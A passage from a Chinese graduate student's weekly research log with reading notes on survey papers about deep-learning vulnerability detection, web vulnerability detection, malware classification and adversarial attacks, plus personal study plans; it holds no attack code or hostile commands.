TOVALIDITY</strong>：</p><ul><li>其一是<strong>模型的可解释性</strong>：现已被推广到恶意代码的检测和安全应用，但是在漏洞检测上还很少</li></ul></li></ul><h4 id="总结-25">总结</h4><ul><li><p><strong>阅读论文后的总结：</strong></p><p>对于文中涉及的<strong>重要概念与技术方法</strong>都查阅了资料进行学习和理解，以上是记录的全过程，以下是其中的一些收获：</p><p>本周所阅读的论文探讨的问题：<strong>深度学习是否能学习代码的模式去检测漏洞</strong>；这也正是本文的标题。具体来说包含以下几个方面：</p><blockquote><ol type="1"><li>漏洞检测的DL模型的可解释性问题</li><li>实现四个注意力模型（两种分类）进行了实验</li><li>定义两个评估指标评估模型的可解释性</li></ol></blockquote><p>上周正好提到在静态分析代码时的一种漏洞检测方式正是：<strong>基于代码模式的漏洞检测方法</strong></p><p>针对这种方法，主要有<strong>三个步骤环节</strong>：数据的预处理、模型的测试、模型的生成</p><p><strong>总的来说</strong>：之前，我只是知道恶意代码分析<strong>有什么方式</strong>，ok,这次我深入了解了代码的分析和处理方法——基于代码模式的方法：学习了它的<strong>整个流程</strong>。</p><p>我发现：深度学习在漏洞检测上很重要一点是：引入<strong>注意力机制</strong>去处理源代进而学习特征</p></li><li><p><strong>其他收获：</strong>当检索到相关的论文困难时，检索特定作者名字是个不错的方式，并可以阅读作者所有相关论文。</p></li><li><p><strong>下一个目标</strong>：上周学习了两篇论文，其中一篇是<strong>二进制程序</strong>的漏洞挖掘，另一篇是<strong>web应用</strong>的漏洞挖掘</p><p>通过检索发现现在的主要研究集中在二进制程序上，因此我打算<strong>另辟蹊径</strong>，更多地探索在web应用上的漏洞挖掘</p></li></ul><h3 id="section-39">2023-03-17</h3><h4 id="关于一些期刊的了解">关于一些期刊的了解</h4><blockquote><ul><li><strong>ACM Computing Surveys</strong>是计算机领域的国际顶级期刊<strong>，专注刊登计算机领域的最新综述研究成果，2020-2021年度影响因子10.282，是中科院JCR一区Top期刊。</strong></li><li><strong>IEEE COMMUNICATIONS SURVEYS &amp; TUTORIALS</strong>中科院JCR分区一区TOP</li></ul></blockquote><h4 id="论文1-8">论文1：</h4><blockquote><ul><li><a href="https://www.hindawi.com/journals/scn/2020/8858010/">ASurvey of Automatic Software Vulnerability Detection, Program Repair,and Defect Prediction Techniques</a>（<strong>CCF-C:</strong>Securityand Communication Networks 2020）</li><li>time:Published 30 September 2020</li><li>记录我所学习和能理解的知识</li></ul></blockquote><hr /><ul><li>漏洞检测<ul><li>根据静态分析技术：<ul><li>基于代码相似性的漏洞检测方法：clone detection，相似的程序代码具有相似的漏洞<ul><li>Grammar-Based Clone Detection Methods.<ul><li>代码表征</li></ul></li><li>Semantic-Based Clone Detection Methods</li></ul></li><li>基于代码模式的漏洞检测方法：According to whether the program needsto be run<ul><li>static detection methods</li><li>dynamic detection methods,</li></ul></li><li>静态分析和神经网络训练原理<ul><li>样本代码提取</li><li>特征提取<ul><li>漏洞特征提取主要涉及如何选择合适的颗粒度来表示软件程序和漏洞检测</li></ul></li><li>词向量生成<ul><li>深度学习或神经网络将向量作为输入，我们需要将程序表示为对漏洞检测有语义的向量</li></ul></li><li>神经网络模型训练和分类<imgsrc="https://s2.loli.net/2023/03/16/sbr8P15Kqyucd4W.png"alt="image-20230316205203892" /><ul><li><strong>训练</strong>：训练阶段将从历史代码库中提取的代码向量表示作为输入，其输出是神经网络的微调模型参数</li><li><strong>检测</strong>：从新的软件程序中提取的代码向量表示被作为输入</li></ul></li></ul></li><li><strong>动态方法</strong>：与静态方法相比，动态方法分析漏洞是为了获得具体的运行信息，所以分析出来的漏洞一般比较准确，误报率也比较低。</li></ul></li><li>Dissussion<ul><li>深度学习技术可以减少人为的<strong>特征工程</strong>，在未来的研究过程中，有望取代传统的漏洞检测方法，大幅提高漏洞检测性能。然而，深度学习在漏洞检测方法中面临着许多<strong>缺陷</strong>，其中模型往往是基于程序源代码进行训练的</li><li><strong>神经网络结构的优化</strong>和<strong>特征参数的选择</strong>一直是相关从业人员面临的问题。现有的代码漏洞检测技术往往是基于<strong>10倍交叉验证</strong>的训练方法来获得最优参数，这种方式对于大规模的项目数据来说往往会影响训练时间和模型性能。</li></ul></li></ul></li></ul><hr /><ul><li>Automatic Software Program Repair<ul><li>Patching Process<ul><li><p>the software fault location phase,</p></li><li><p>the patch generation phase,</p></li><li><p>Te search-based patch generation method</p></li><li><p>Te semantic-based patch generation method</p></li><li><p>and the patch evaluation phase.</p></li></ul></li><li>Grammar-Based Patching Technology<ul><li>Token-LevelLearningandRepairTechnology.</li><li>Text-Based Learning and Repair Technology</li></ul></li><li>Semantic-Based Patching Technology</li></ul></li><li><code>In the future program repair technology, we can learn from the vulnerability detection technology that combines with AST and PDG technology to enhance the performance of the existing program semantic repair technology and analysis of the impact of feature parameters on the model performance to further promote the applications of deep learning technology in the program repair technology</code></li></ul><hr /><ul><li>Automatic Software Defect Predicting<ul><li>Within-Project Defect Prediction</li><li>Crossproject Defect Prediction</li><li>Just-In-Time Defect Prediction</li></ul></li></ul><hr /><ul><li>Future Directions and Challenges<ul><li>Feature Generation.</li><li>Model Selection</li><li>Datasets.</li><li>Performance Evaluation</li><li>Feature Parameters</li></ul></li></ul><h4 id="论文2-3">论文2</h4><blockquote><ul><li><a href="https://dl.acm.org/doi/10.1145/3474553">Efficiency andEffectiveness of web application vulnerability detection approaches: AReview</a> （<a href="https://dl.acm.org/toc/csur/2022/54/9">ACMComputing Surveys</a>：中科院分区一区top）</li><li>time:<ul><li>Published: 8 October 2021</li><li>Accepted: 1 July 2021</li><li>Revised: 1 June 2021</li><li>Received: 1 March 2020</li></ul></li><li>最流行的科学出版物数据库：<ul><li>IEEE Xplore、</li><li>ACM数字图书馆、</li><li>Elsevier Science Direct、</li><li>SpringerLink</li><li>Web of Science</li></ul></li></ul></blockquote><ul><li>web application vulnerability detection (WAVD)</li><li>类别<ul><li>输入验证（IPV）漏洞<ul><li>Sql注入</li><li>Xss</li><li>Ldap注入</li><li>remote code execution (RCE)</li><li>local or remote file inclusion (LFI/RFI).</li></ul></li><li>会话管理（SM）漏洞<ul><li>session fixation</li><li>session sniffing</li><li>cross-site request forgery (CSRF)</li></ul></li><li>应用逻辑（AL）漏洞）<ul><li>parameter manipulation</li><li>weak access control</li><li>workflow bypass</li><li>workflow violation</li></ul></li></ul></li><li>更详细的类别：Open Worldwide Application Security Project (OWASP)top 10</li><li>AST（Abstract Syntax Tree）指抽象语法树，</li></ul><blockquote><p>是指程序代码在<strong>语法分析阶段</strong>被转换成树形结构的一种形式。在编译器或解释器中，AST通常用于表示源代码的抽象语法结构，以便于后续的<strong>代码分析和优化</strong>等操作。它是一种中间表示形式，可以更方便地进行代码分析和转换，例如语法检查、代码优化、重构等。同时，由于AST只表示程序的抽象语法结构，因此它通常不包含与<strong>程序执行相关的细节信息</strong>，例如变量的具体值、函数调用的具体执行过程等。</p></blockquote><ul><li>The artifacts analyzed by the WAVD approaches<imgsrc="https://s2.loli.net/2023/03/18/a8nvdR9Zyj46XgI.png"alt="image-20230318014038238" /></li></ul><blockquote><ul><li>模型（Model）：表示系统或应用程序的抽象描述，可以是图形、图表或其他形式。</li><li>属性（Attribute）：表示模型或代码元素的特征或性质，例如类的名称、方法的返回类型等。</li><li>代码元素（Codeelement）：程序代码中的一个组成部分，例如类、方法、变量等。</li><li>AEP（Attack ExecutionPlan）：指攻击者的攻击执行计划，包括攻击的目标、方法和技术等。</li><li>约束或模式（Pattern）：指一组预定义的规则或模板，用于描述和识别软件中的特定问题或漏洞。</li><li>指纹（Fingerprint）：指软件或系统中的独特标识符，用于识别和区分不同的软件或系统。例如，每个操作系统和应用程序都有自己的指纹，可以用于识别和区分它们</li></ul></blockquote><ul><li>一个在ML 中经常出现的词<strong>F-measure</strong>，</li></ul><blockquote><p>也称为F1-score，是一种用于衡量二元分类模型性能的指标。它结合了准确率（precision）和召回率（recall）两个指标，是它们的调和平均数。具体而言，F1-score可以表示为：</p><p>F1-score = 2 * (precision * recall) / (precision + recall)</p><p>其中，准确率指被分类器正确分类的正样本数与所有被分类为正样本的样本数之比。召回率指被分类器正确分类的正样本数与所有真实正样本数之比。</p><p>F1-score将准确率和召回率综合起来，可以在评价模型性能时同时考虑模型对正样本和负样本的分类能力。在不同模型之间比较时，F1-score可以更全面地反映模型的分类性能，特别是在样本不均衡的情况下。</p></blockquote><ul><li>Dissussion</li></ul><blockquote><p><code>我们发现大多数（105个中的78个）我们确定的主要研究集中在注入漏洞上。许多其他的漏洞，如重定向后的执行、逻辑漏洞、状态侵犯、侧信道、DoS和配置，都没有得到充分的探索。OWASP前10名中列出的一些漏洞，如XML外部实体（XXE）和不安全的反序列化，还没有被许多初级研究覆盖。由于 "一个软件安全系统的安全性取决于其最薄弱的部分"[170]，因此需要更多关于检测这些未被探索的漏洞的研究</code>。</p></blockquote><ul><li><ul><li>两个指标：二元分类模型中经常使用的评估指标<ul><li>FPR 和FNR</li></ul></li></ul></li></ul><blockquote><p><code>我们审查的大多数主要研究集中在基于PHP和Java的应用程序上。没有一项研究关注使用Python开发的网络应用，很少有研究关注基于JavaScript的应用。根据市场研究[172,173]，Python和JavaScript正在成为网络应用程序开发中最常用的编程语言。我们需要更多的WAVD研究和测试套件来关注使用Python和JavaScript开发的应用程序</code></p></blockquote><ul><li>总结：<ul><li>这篇论文讨论了三个问题：<ul><li>对WAVD 方法的分类研究</li><li>方法的效率和有效性研究（很多内容看不懂）</li><li>漏洞检测工具套件的讨论</li></ul></li><li>主要是注意disscussion中的future work</li></ul></li></ul><h4 id="总结见本地文档">总结：见本地文档</h4><h3 id="section-40">2023-03-10</h3><h4 id="论文学习">论文学习</h4><h5 id="论文1-9">论文1</h5><blockquote><ul><li><ahref="https://link.springer.com/article/10.1007/s00521-021-06597-0">Applicationsof deep learning for mobile malware detection: A systematic literaturereview</a>(NCA:人工智能-CCF-C)</li><li><code>Received: 27 November 2020 / Accepted: 4 October 2021</code>因为是一片综述文章，所以时间需要注意</li><li>橘色片段皆是从原文摘录的信息</li></ul></blockquote><ul><li><p>机器学习在恶意代码检测中的应用</p><ul><li>Malware detection</li><li>Malware similarity analysis<ul><li>Variants detection</li><li>Families detection</li><li>Differences detection</li></ul></li><li>Malware category detection</li></ul></li><li><p>混淆</p><ul><li>静态分析<ul><li>无法应用在使用了混淆技术的恶意代码上</li><li><strong>混淆</strong><ul><li>encryption,</li><li>oligomorphic,</li><li>polymorphic,</li><li>metamorphic</li><li>stealth,</li><li>and packaging</li></ul></li></ul></li><li>动态分析</li><li>混合分析</li></ul></li><li><p>DL and DL algorithms</p><ul><li>ANN<ul><li>input layer</li><li>hideen layer</li><li>output layer</li></ul></li><li>DL<ul><li>比ANN 有更多样的层数</li><li>Recursive neural network (RvNN)</li><li>RNN<ul><li>LSTM</li></ul></li><li>Convolutional neural network (CNN)</li><li>Deep generative networks (DGN)</li><li>divided deep learning architectures into the three classes<ul><li>generative,</li><li>discriminative,</li><li>and hybrid</li></ul></li></ul></li></ul></li><li><p>目前基于<strong>windows</strong>恶意代码的检测是比较多的</p></li><li><p>following research directions and challenges:</p><ul><li>availability of the open and public datasets,</li><li>concept drift concept,</li><li>incremental learning,</li><li>adversarial learning,</li><li>and the problem of class imbalance</li></ul></li><li><p>Malware detection</p><ul><li>signature-based,</li><li>behavior-based,</li><li>heuristic-based,</li><li>model checking-based,</li><li>deep learningbased,</li><li>cloud-based,</li><li>mobile-based,</li><li>IoT-based techniques</li></ul></li><li><p>静态分析</p><ul><li>基于安卓特性</li><li>基于操作码</li><li>基于程序图</li><li>基于符号执行</li></ul></li><li><p>半监督学习方法在恶意代码检测的应用还比较少</p></li><li><p>很少研究关注静态特征和动态特征的结合</p></li><li><p>多模式和多视角的深度学习值的注意</p></li><li><p>当前研究主要关注其中的一种或两种数据<imgsrc="https://s2.loli.net/2023/03/09/2myoRwL4iKN7VpJ.png"alt="image-20230309105101450" /></p></li></ul><hr /><ul><li><p>在研究malware的深度学习模型时不需要特征选择技术</p></li><li><p>实验数据的选取<imgsrc="https://s2.loli.net/2023/03/09/S2fAOXvIjPBL5Hn.png" /></p></li><li><p>深度学习开发平台的选择<imgsrc="https://s2.loli.net/2023/03/09/mEepQA4lPqbZT3n.png"alt="image-20230309213948238" /></p></li><li><p>Challenge and proposed solutions <imgsrc="https://s2.loli.net/2023/03/09/K4fhE6TROkwceuj.png"alt="image-20230309214744642" /></p></li><li><p>Dissusion（创新点）</p><ul><li><p><code>the integration of reinforcement learning with deep learning approaches and the application of these models on malware detection is considered as a future research direction</code></p></li><li><p>静态特征与动态特征的结合还很少人做</p></li><li><p>将不同的模型融合到一个模型是个不错的想法；其次，<code>Also, we observed that some machine learning types such as multi-task learning, multi-modal learning, and multiview learning were neglected, but they can be applied effectively in mobile malware detection problem.</code></p></li><li><p><code>准确度和F-measure是广泛使用的评价参数，交叉验证是最受欢迎的验证方法</code>：不太理解这个问题。感觉是：使用什么参数去评估实验效果？</p></li><li><p>寻找最优的算法，目前研究主要集中在DNN和CNN</p></li><li><p>模型和和算法区分</p></li></ul><blockquote><ul><li>模型：描述解决问题的函数</li><li>算法：机器学习中的“算法”是在数据上运行以创建机器学习“模型”的过程,e.g.:<ul><li>线性回归算法的结果是一个由具有特定值的稀疏向量组成的模型。</li><li>决策树算法的结果是一个由具有特定值的 if-then 语句树组成的模型。</li><li>神经网络 / 反向传播 /梯度下降算法一起产生一个由具有特定值的向量或权重矩阵和特定值的图结构组成的模型。</li></ul></li></ul></blockquote><ul><li>Better maintenance of malware datasets and sustainable platforms forhosting malware datasets We identified the following research directionsto pave the way for further research and explained them in theDiscussion section:</li><li>The development of unsupervised deeplearning approaches for malwaredetection</li><li>The development of semi-supervised deep learning models for malwaredetection</li><li>The development of reinforcement learning-based deep learningtechniques for malware detection</li><li>More hybrid features-based techniques</li><li>A framework for better</li><li>benchmarking of deep learning-based approaches and betterexperimental design to compare more DL algorithms to reach more generalresults</li><li>Better maintenance of malware datasets and sustainable platforms forhosting malware datasets</li><li>More datasets should be used in experimental design to compare theperformance of ML/DL algorithms to reach more reliable results</li></ul></li></ul><h5 id="论文2-4">论文2</h5><blockquote><ul><li><a href="https://ieeexplore.ieee.org/document/9964330">A Survey ofAdversarial Attack and Defense Methods for Malware Classification inCyber Security</a>（中科院JCR分区一区TOP:IEEE COMMUNICATIONS SURVEYS&amp; TUTORIALS）</li><li>时间：<code>Manuscript received 3 May 2022; revised 4 September 2022; accepted 4 November 2022. Date of publication 28 November 2022; date of current version 24 February 2023</code></li><li>橘色片段皆是从原文摘录的信息</li></ul></blockquote><ul><li><p><strong>Index Terms</strong>—Cyber security, malware, malwareclassification, adversarial examples, adversarial robustness.</p></li><li><p><code>Attackers propose various  attack methods to generate adversarial malware examples to bypass ML-based malware classifiers.</code></p><ul><li><code>For white-box attacks, gradient information is used to guide the generation of adversarial perturbations [33], [34], [35].</code></li><li><code>For black-box attacks, some researchers train a substitute model to fit the black-box victim classifier and then leverage white-box methods [36], [37], [38].</code></li><li><code>Others only use prediction results to manipulate original examples and generate adversarial examples [39], [40], [41], [42].</code></li><li><code>Researchers also propose defense methods to improve the robustness of ML models against adversarial attacks, such as adversarial training [43][44],ensemble learning [45], [46], GAN-baseddefense</code></li></ul></li><li><p><code>Some researchers propose to preprocess input data by identifying and removing adversarial examples [49].</code></p></li><li><p><code>Some defense methods select subsets of features in order to increase the difficulty of adversarial malware attacks [19], [50].</code></p></li><li><p><code>Besides, adversarial training and ensemble learning methods are introduced to improve the adversarial robustness of ML-based malware classifiers [16], [34], [51], [52].</code></p></li><li><p>general process of ML-based malware classification<imgsrc="https://s2.loli.net/2023/03/11/KHhlPGFpWxN9XBM.png"alt="image-20230311003702766" /></p><ul><li>Data Preprocessing,<ul><li><strong>Data augmentation</strong> and <strong>equalizationtechniques</strong> can be used in this phase to train stronger malwareclassifiers</li><li><strong>Unpacking techniques</strong> can also balance trainingdata, which leads to more convincing experimental results.</li></ul></li><li>Feature Collection,</li><li>静态特征： raw bytes, operation codes, function calls, etc.</li><li>动态特征： Application Programming Interface (API) calls, networktraffic, hardware-based features, etc.</li><li>Feature Extraction,<ul><li>High-level features are extracted to select <strong>importantfeatures</strong>, reduce feature size, and construct input features forthe classification model.</li><li><strong>vectorization techniques</strong> (such as byte embeddingand word embedding) and some feature compression methods (such asmalware images and feature selection) can be leveraged.</li></ul></li><li>Classification,<ul><li>Classification: ML-based models are chosen as malware classifiers tomake predictions on input features.Basic ML models can be used asmalware classifiers, such as Support Vector Machine (SVM), LogisticRegression (LR), Random Forest (RF), etc. Some DL models are also used,such as Deep Neural Network (DNN), Convolutional Neural Network (CNN),Recurrent Neural Network (RNN), etc.</li></ul></li><li>Decision Making</li><li>分类的两种方式<ul><li>Binary-Classification: A given software example is deter- mined asmalicious or benign, which is also called malware detection in manystudies.</li></ul><ol start="2" type="1"><li>Multi-Classification: A given malware example is classi- fied intoone malware family.</li></ol></li><li>一些模型示例<imgsrc="https://s2.loli.net/2023/03/11/TfvanXKsJGAYb2u.png"alt="image-20230311002016915" /></li><li>comparison<imgsrc="https://s2.loli.net/2023/03/11/afCWghNbxU2Rm1S.png"alt="image-20230311002646769" /></li><li>分类器 Challenges<ul><li>Classifier Aging Problem</li><li>Data Bias Problem：</li><li>在特征提取的时候虚拟环境会被恶意代码识别，因此而隐藏自己的恶意行为<ul><li>解决：Parallel Adversarial Network (PAN)</li></ul></li></ul></li><li>攻击<img src="https://s2.loli.net/2023/03/11/qUeps4tnJLkh8QS.png"alt="image-20230311012141298" /><ul><li>White-box Attacks: Attackers have full knowledge of the victimmodel, including training data, model structure, parameters, gradientinformation, and predictions.</li></ul></li><li>two kinds of adversarial attack methods:<ul><li>Targeted Attacks: Attackers mislead the victim model to produce achosen classification result.</li><li>Untargeted Attacks: Attackers mislead the victim model to produce awrong classification result.</li></ul></li><li>基于机器学习的对抗攻击<ul><li>White-Box<ul><li>L-BFGS attack</li><li>FGSM attack</li><li>Least-likely class attack</li><li>PGD attack</li><li>DeepFool attack</li><li>JSMAattack</li><li>C&amp;W attack:</li></ul></li><li>Black-Box<ul><li>Substitution attack</li><li>Boundary attack</li><li>Optimizationattack</li><li>SimBA attack</li><li>AdvGAN</li><li>Zoo attack</li></ul></li></ul></li></ul></li><li><p>ADVERSARIAL ATTACK METHODS ON ML-BASED MALWARE CLASSIFIERS<imgsrc="https://s2.loli.net/2023/03/11/EmiQnNMTpRodask.png"alt="image-20230311014242325" /></p></li><li><p>攻击方法面临的挑战：</p><ul><li>Query-Efficiency</li><li>Inverse-Mapping Problem：不太理解</li></ul></li><li><p>防御：improve the robustness of classifiers in the ML domain.<img src="https://s2.loli.net/2023/03/11/AGjrIKfH96ET1WZ.png"alt="image-20230311015415990" /></p><ul><li>Adversarial Training:<ul><li>FGSM-based adversarial training:</li><li>PGD-based adversarial training</li><li>Free adversarial training</li><li>Fast adversarial training</li><li>YOPO adversarial training</li><li>Rob-GAN:</li></ul></li><li>Defensive Distillation</li><li>Randomization-Based Defense:</li><li>Adversarial Example Detection:</li><li>Ensemble Learning:</li></ul></li><li><p>挑战总结：</p><ul><li><strong>Evolution</strong> of Attackers<ul><li>现在有效的防御会被不断进步的攻击所攻破</li></ul></li><li>Provability and Interpretability<ul><li>建议提出可解释、可证明的ML(DL)模型</li></ul></li></ul></li><li><p><strong>FUTURE</strong> WORK DIRECTIONS</p><ul><li>Attacker:<ul><li>Generating Usable Adversarial Examples:保留恶意软件原始功能是至关重要的</li><li>Better Inverse-Mapping Manipulations:</li><li>Aiming at Stronger Classifiers:如果有更强的分类器，那么评估攻击就会更加有效果</li></ul></li><li>Defender<ul><li>Robustness and Accuracy</li><li>Large-Scale Malware Classification Datasets</li><li>Adapting to Real-World Settings:</li><li>Virtual Analysis Environments:</li><li>Immunology-Inspired Defense Framework</li><li>Interpretable Models and Provable Robustness:</li></ul></li></ul></li></ul><h4 id="总结-26">总结</h4><ul><li><p>发现<ahref="https://dblp.uni-trier.de/">dblp</a>这个数据库挺好用的（感觉几乎都是计算机领域的文章）</p><ul><li>其次有个浏览器插件挺好用，能在文章后面显示CCF 的等级</li><li>总的来说，感觉自己<strong>搜索能力和搜索效率</strong>提高了不少，更能找到自己需要的东西</li></ul></li><li><p>因为不知道从哪里继续，于是找了两篇顶刊上的综述，希望能得到<strong>启发</strong>，同时梳理一下我的<strong>脉络</strong></p><ul><li>其实之前也看了点综述论文，但是没有看顶刊上的</li></ul></li><li><p>这两篇论文都是属于综述类型</p><ul><li>第一篇是详细讲解了<strong>ML在恶意代码检测与分类上的应用</strong></li><li>第二篇是介绍<strong>基于恶意代码分类器的对抗样本的防御和攻击</strong></li></ul></li><li><p>收获：</p><ul><li><p>首先是对<strong>恶意代码与对抗样本知识</strong>的积累与巩固</p></li><li><p>其次是让我对我的研究方向有更<strong>清晰的认识</strong>，基于上述两篇文章，我用了自己的方式描述出了<strong>我的所学和理解</strong>。</p><ul><li><p>画了一个图展示了我现在对课题的理解<imgsrc="https://s2.loli.net/2023/03/11/DdovuJ7WVq4scAz.png"alt="Malware&amp;Adversary" /></p></li><li><p>对<strong>全局的分析</strong>：</p><ul><li>首先是研究内容由两部分组成：恶意代码分类器+对抗样本的生成<ul><li>恶意代码分类器：<ul><li>不同平台上的恶意代码（windows,安卓.etc），选择其一</li><li>对输入的样本进行特征提取：有三种方式，每种方式能够提取不同的特征，三者选一即可，混合方式目前研究的少。（选择依据）</li><li>深度学习还是传统的机器学习模型：传统的机器学习模存在一些缺陷<ul><li>深度学习算法（选择依据）</li></ul></li></ul></li><li>对抗样本的生成是需要基于前一步构造的恶意代码分类器的，就比如特征是静态？动态？混合？这一步就会影响攻击算法的选择<ul><li>白盒攻击还是黑盒攻击：取决于对分类模型已知多少信息<ul><li>攻击算法（选择依据）</li><li>攻击方法：<ul><li>只是使得对抗样本错误分类</li><li>指定类别错误分类</li></ul></li></ul></li></ul></li></ul></li><li>这整个过程还存在很多的<strong>细节</strong>：<ul><li>数据样本的选择应该尽可能覆盖的范围大</li><li>对数据的处理方式</li><li>恶意代码中的混淆技术会使得我们对它的特征分析更加困难</li><li>特征很多，需要选择关键的特征</li><li><strong>创新与挑战</strong>（是否可以作为我们寻求的创新点）<ul><li>数据处理</li><li>恶意代码分类器<ul><li>概念漂移：恶意代码日新月异，模型也需要重新训练</li><li>数据偏差问题</li><li>混淆技术和恶意代码排斥虚拟的分析环境问题</li></ul></li><li>攻击挑战<ul><li>查询效率</li><li>更强大的分类器</li><li>增加的扰动不能更改恶意软件本身的结构和功能</li></ul></li><li>防御挑战<ul><li>增强鲁棒性</li><li>训练可解释、可证明的模</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>问题：</p><ul><li>对防御这方面，我暂时还了解的比较少</li><li>对于训练模型算法的选择，还需要我先把机器学习（ML） 、深度学习（DL）学完才能更深入的接触</li><li>另一方面，恶意代码的分析也是个复杂的过程</li></ul></li><li><p>下一个<strong>目标</strong>：</p><ul><li>对应作者提出的<strong>问题与挑战</strong>，查阅相关资料</li><li>学习整个研究内容中的其他细节</li><li>除去细节，现在对这个研究内容的整个过程还是比较熟悉。需要<strong>每个环节</strong>多加思考，提出一些奇思妙想与假设、猜测并验证。（ok，其实我现在就已经有一些想法了）</li></ul></li><li><p>对于各个环节，我现在的一些想法（由于目前知识储备不够，有些可能就是异想天开）：</p><ul><li>对于对抗样本的攻击防御：还可以这样做，针对现有的防御方法，我们想办法攻破它；针对现有的攻击方法，采取合适的方式进行防御。</li><li>能否构造一个分类器:适用于检测Windows平台和Android平台上的恶意代码<ul><li>或者创造一种对抗样本的生成方式适用于多个平台上的恶意代码</li></ul></li><li>恶意代码的特征多样，能否发现一种新的特征，使得检测的准确性和鲁棒性更高<ul><li>或者说，对于恶意代码在虚拟环境中隐藏自己恶意行为的现象，找到一种新的分析环境解决这个问题</li></ul></li><li>关于模型算法上的问题还需要我进一步掌握相关的知识</li><li>我感觉，只要熟悉了整个流程，并且有了一定的知识储备，就能提出很多问题。</li></ul></li></ul><h3 id="section-41">2023-03-03</h3><h4 id="machine-learning-学习">Machine learning 学习</h4><ul><li><ahref="https://jf710001011.github.io/2023/03/04/ml07/">学习记录</a></li></ul><h4 id="总结-27">总结</h4><ul><li><p>问题：</p><ul><li>最近感觉有<strong>懈怠</strong>，花的时间不多；但是都是一样的感觉，当一件事没碰它的时候，总是不想干，但是一旦着手去做，就会沉浸其中，毕竟是自己选择的喜欢做的事。<ul><li>下午与老师探讨一番，关于科研中该如何去看论文的问题：<strong>枝干与叶子</strong>，确定叶子，再反溯回枝干。</li></ul></li></ul></li><li><p>基于上述问题，因此需要<strong>重新规划一番</strong>，画出<strong>一些时间点</strong>，督促自身。</p><ul><li><p>首先论文看的点还是不够细致到一个具体问题，继续多看论文。</p></li><li><p>机器学习还是得继续，找准跟我研究内容相关的部分</p></li><li><p>时间点：</p><ul><li><p>04-01前找到那个点，确定自己需要<strong>解决的问题</strong>。</p></li><li><p>06-01前：将<strong>机器学习</strong>学完（就跟着视频全部学完，感觉也不多吧），如下这三部分，大概150个短视频，同时积累<strong>恶意代码</strong>知识。<imgsrc="https://s2.loli.net/2023/03/04/8ZOLdhBt5IsR9me.png"alt="image-20230304025037998" /></p></li><li><p>07-01前：寻找到<strong>问题的解决方案</strong>。</p></li></ul></li></ul></li><li><p>感觉自己还是很想能发出一篇不错的论文：</p><ul><li>一方面认为这是证明自己在研究生阶段<strong>有所学、有所获</strong>的一个证明。</li></ul></li><li><p>另一方面自己确实想在人工智能、安全的前沿领域有更多的了解，应该会对自己<strong>以后的职业</strong>（从事web应用和软件的恶意代码）有更多影响。</p></li></ul><h3 id="section-42">2023-02-17</h3><h4 id="机器学习">机器学习</h4><ul><li><ahref="https://jf710001011.github.io/2023/02/18/ml06/">多元线性回归的梯度下降</a></li></ul><h4 id="论文学习-1">论文学习</h4><ul><li><p><ahref="https://www.sciencedirect.com/science/article/pii/S0167404822001572#bib0028">Adversarialmalware sample generation method based on the prototype of deep learningdetector</a>（4）,相关记录：2022-12-30，2022-12-09，2022-10-28</p></li><li><p>认为自己有了一定的<strong>沉淀</strong>，回去重温，应该会有收获，并将<strong>重要的点做下记录</strong></p></li><li><p>本文一个<strong>重要的发现或者思想</strong>：当我们最大化输出层中一个单元的激活值时，我们可以在模型的输入空间中得到一个原型样本。这<strong>启发</strong>了作者基于原型样本去生成对抗样本。</p><ul><li>首先<strong>理解原型概念</strong>很重要：The prototype is a typicalexample of the selected out- put class</li><li>out-put class?，暂时不懂这个词</li></ul></li><li><p>对抗样本<strong>第一次被提出</strong>的时间</p></li><li><p>对抗样本的产生方法：FGSM,I-FGSM,C&amp;W。这些需要深入了解</p></li><li><p>深度学习的事后可解释性？</p></li><li><p>引入了<strong>中间样本</strong>的概念</p></li><li><p><code>Activation maximization</code>这个方法似乎很重要</p></li><li><p>阅读到了第3部分，模型设计与对抗样本的生成</p><ul><li><p>对于这两个问题，作者的考虑如下</p><ul><li>对抗样本应该达到什么样的效果</li><li>敌手即模型本身需满足什么条件，比如需要具备什功能、又需要给予什么限制</li><li>很重要的一点是：对于生成对抗样本的方法，作者联系了对于图像生成对抗样本，了解了差异之后，随机即在前人基础上做出改进以实现自己的实验目的</li></ul><hr /></li><li><p>本文对抗样本是基于windows系统下的恶意软件，因此对于二进制文件的操作需要很了解。因此说基于的背景也是关键的一环。</p></li></ul></li></ul><h4 id="总结-28">总结</h4><ul><li>本周仍然是学习了机器学习，主要学习了特征缩放和特征工程，以及新的模型：逻辑回归</li><li>在阅读论文上，经过一些沉淀，对论文的理解是更深刻，所以逐渐的会去想摸清作者的思路，去做这些步骤的原因</li><li>但是还是基于专业知识不够，无法对文中的内容提出问题或者自己的见解。</li></ul><h3 id="section-43">2023-02-10</h3><h4 id="机器学习-1">机器学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2023/02/11/ml04/">几个实验记录</a></li><li><ahref="https://liuhaihuaaacc.gitee.io/2023/02/11/ml05/">理论学习记录</a></li></ul><h4 id="web恶意代码学习">web恶意代码学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2023/02/09/the-pentester-blueprint/">学习记录</a></li></ul><h4 id="总结-29">总结</h4><ul><li>问题：因为本周还想再完成一些内容，因此迟发了一点汇报</li><li>收获：<ul><li>本周主要是在之前Maching Learning学习的基础上进行了实验</li><li>首先是 对jupyternotebook环境使用不熟，在执行代码的时候出现很多报错，折腾了挺多时间</li><li>整个过程主要是在 <strong>jupyter notebook</strong>环境下学习<strong>使用python</strong>实现几个需求<ul><li>使用多个数学py库进行数学计算与绘制坐标图、等高线图和3D图</li></ul></li><li>在这个过程中，<ul><li>进一步深入学习了使用代价函数寻找参数拟合直线之间的关系</li><li>代价函数与与学习速率 之间的关系</li><li>代价函数在最初的下降与最后逼近最小值时的下降步伐</li></ul></li></ul></li></ul><h3 id="section-44">2023-02-03</h3><h4 id="maching-learning的学习">maching learning的学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/12/03/ml03/">笔记记录</a></li></ul><h4 id="web安全的学习">web安全的学习</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/12/20/web-dvwa/">笔记记录</a></li></ul><h4 id="总结-30">总结</h4><ul><li><p>收获：</p><ul><li>本周主要学习了机器学习相关的知识：教程讲的很详细，因此学习起来还是比较顺畅。</li><li>学习的内容主要如下</li></ul><figure><img src="https://s2.loli.net/2023/02/03/KC4xS1hIiDwLlt3.png"alt="image-20230203192902076" /><figcaption aria-hidden="true">image-20230203192902076</figcaption></figure><figure><img src="https://s2.loli.net/2023/02/03/klj2abI8hsL9P1T.png"alt="image-20230203192945805" /><figcaption 